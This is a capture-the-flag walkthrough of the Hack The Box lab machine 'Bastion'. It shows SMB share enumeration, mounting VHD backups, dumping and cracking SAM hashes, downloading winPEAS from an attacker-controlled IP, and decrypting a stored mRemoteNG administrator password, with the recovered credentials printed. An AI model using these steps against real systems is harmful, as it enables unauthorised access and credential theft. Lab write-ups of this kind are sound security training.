# recon
## nmap
```
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```
not many Windows have port 22 open...

## smb
```console
kali@kali:~/HTB/bastion$ smbclient -L '\\bastion.htb\'
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	Backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```
`Backups` looks juicy!! let's connect to `Backups` sharename
```console
kali@kali:~/HTB/bastion$ smbclient '\\10.10.10.134\Backups' -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct 16 10:39:48 2020
  ..                                  D        0  Fri Oct 16 10:39:48 2020
  nmap-test-file                      A      260  Fri Oct 16 10:39:48 2020
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 07:44:02 2019
```

```
smb: \WindowsImageBackup\L4mpje-PC\> ls
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  Backup 2019-02-22 124351           Dn        0  Fri Feb 22 07:45:32 2019
  Catalog                            Dn        0  Fri Feb 22 07:45:32 2019
  MediaId                            An       16  Fri Feb 22 07:44:02 2019
  SPPMetadataCache                   Dn        0  Fri Feb 22 07:45:32 2019
```
https://superuser.com/questions/960925/what-is-catalog-and-mediaid-in-windowsimagebackup 

System Image backups also create several other files:
- A MediaId file in the folder to identify the disk image
- GlobalCatalog and BackupGlobalCatalog files in the Catalog folder to track the System Image backup image versions
- Numerous XML files in the Backup folder, which contain configuration settings for the backup file


```
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> ls
  .                                  Dn        0  Fri Feb 22 07:45:32 2019
  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 07:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 07:45:32 2019

		7735807 blocks of size 4096. 2763237 blocks available
```
## foot hold
as admin said, there is no way to copying the backup so the plan is mounting smb share and copy only what we need. I did some research about how to mount the share and and mount vhd to our kali, here is what I found
- https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25
- https://medium.com/@abali6980/mounting-vhd-files-in-kali-linux-through-remote-share-smb-1c4d37c22211
- https://xo.tc/how-to-mount-a-vhd-file-on-linux.html

so let do it!!
```
kali@kali:/mnt$ sudo mount -t cifs "//bastion.htb/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/" /mnt/backup #mount smb share
🔐 Password for root@//bastion.htb/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/:                          
kali@kali:/mnt$ ls backup/
9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
BackupSpecs.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
kali@kali:/mnt$ sudo mkdir vhd
kali@kali:/mnt$ kali@kali:/mnt$ sudo guestmount --add /mnt/backup/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd -m /dev/sda1 # mount vhd
kali@kali:/mnt$ ls -la vhd
ls: cannot access 'vhd': Permission denied
kali@kali:/mnt$ sudo ls -la vhd
total 400
drwxrwxrwx 1 root root   4096 Feb 22  2019  .
drwxr-xr-x 4 root root   4096 Oct 16 11:19  ..
drwxrwxrwx 1 root root   4096 Feb 22  2019  Boot
-rwxrwxrwx 1 root root 383786 Nov 20  2010  bootmgr
-rwxrwxrwx 1 root root   8192 Feb 22  2019  BOOTSECT.BAK
drwxrwxrwx 1 root root   4096 Feb 22  2019 'System Volume Information'
```
after examining it for a while, didnt seem like we get anything useful here. let mount another vhd and examine it!
```console
kali@kali:/mnt$ sudo guestmount --add /mnt/backup/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd -m /dev/sda1
```
this vhd looks much more interesting BUT no user flag...

here is some links to read:
- https://superuser.com/questions/1416834/what-is-c-windows-system32-config-system
- https://traviswhitney.com/2016/12/30/using-samdump2/
- http://www.computersecuritystudent.com/SECURITY_TOOLS/PASSWORD_CRACKING/lesson2/
so my plan is, copy 2 files, SAM and SYSTEM at `%SystemRoot%\System32\config` -> dump the user password hashes and crack them. Please chack the first like to learn more about `%SystemRoot%\System32\config`. We will use a tool call `sampdump2` to dump hashes, read more at link 2 and 3.
```console
kali@kali:~/HTB/bastion$ sudo samdump2 SYSTEM SAM > hash.txt
kali@kali:~/HTB/bastion$ cat hash.txt 
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
I used john, but it take long time, so let try crackstation while waiting for john.


Boom! we got L4mpje's password -> L4mpje:bureaulampje, let grab user flag
```console
kali@kali:~/HTB/bastion$ ssh L4mpje@bastion.htb 
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                          
<something> 
```
# root
```                                                                            
l4mpje@BASTION C:\Users\L4mpje\Desktop>systeminfo                                                             
ERROR: Access denied                                
```
that is weird, that mean we will not be able to get many info when we use infomation gathering tool such as `winPEAS`. Anyway, let's try to run it anyway. start with getting `winPEAS` to Bastion. `Invoke-WebRequest http://10.10.14.43:8888/winPEAS-x86.exe -OutFile winPEAS.exe`


execute it and observe! here is some info that I think it is interesting...
```
  [+] Installed Applications --Via Program Files/Uninstall registry--                         
   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windo    dows/windo
ws-local-privilege-escalation#software                                                                    
    C:\Program Files (x86)\mRemoteNG                                                               
```
this is some program that is not install by defualt, read more about mRemoteNG [here](https://mremoteng.org/) 
```
    Folder: C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup            
    FolderPerms: L4mpje [AllAccess]                                                            
    File: C:\Users\L4mpje\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\L4mpje-0m\L4mpje-
script.bat                                                                                                    
    FilePerms: L4mpje [AllAccess]                                                              
   ======================================
```
I start to dig more about `mRemoteNG`, googled "mremoteng config file location" and I found this [link](http://forum.mremoteng.org/viewtopic.php?f=4&t=1550). so it seems like `mRemoteNG` have a `Connection File` which stored at `%userprofile%\AppData\Roaming\mRemoteNG\confCons.xml`. lets take a look what contain in the file..
```
 Directory of C:\Users\L4mpje\AppData\Roaming                                                   

22-02-2019  15:01    <DIR>          .                                                           
22-02-2019  15:01    <DIR>          ..                                                          
22-02-2019  14:50    <DIR>          Adobe                                                       
22-02-2019  15:03    <DIR>          mRemoteNG
 Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                         

22-02-2019  15:03    <DIR>          .                                                           
22-02-2019  15:03    <DIR>          ..                                                          
22-02-2019  15:03             6.316 confCons.xml                                                
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                     
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                     
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                     
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                     
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                     
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                     
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                     
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                     
22-02-2019  15:03                51 extApps.xml                                                 
22-02-2019  15:03             5.217 mRemoteNG.log                                               
22-02-2019  15:03             2.245 pnlLayout.xml                                               
22-02-2019  15:01    <DIR>          Themes                                                      
              14 File(s)         76.577 bytes                                                   
               3 Dir(s)  11.309.920.256 bytes free                                              

l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml  
```
Boom! seem like we got a encrypted/encoded admin password, I tried to decode in with base64 but it just gave me a weird char.
```xml
<Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662
a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9k
VqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" Protocol="
RDP".......
```
After googling, I found a tool that we can use to decrypt the password.
```console
kali@kali:~/HTB/bastion$ wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py
2020-10-17 10:10:26 (6.45 MB/s) - ‘mremoteng_decrypt.py’ saved [1535/1535]

kali@kali:~/HTB/bastion$ chmod +x mremoteng_decrypt.py 
kali@kali:~/HTB/bastion$ ./mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9k
> VqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2
```
now ssh to Bastion with admin credential and grab root flag
```console
kali@kali:$ ssh Administrator@bastion.htb
Microsoft Windows [Version 10.0.14393]                                                  
(c) 2016 Microsoft Corporation. All rights reserved.                                    

administrator@BASTION C:\Users\Administrator>type Desktop\root.txt   
```
if you wanna know about `%userprofile%\AppData\Roaming` read [this](https://askleo.com/whats-the-appdata-roaming-folder/)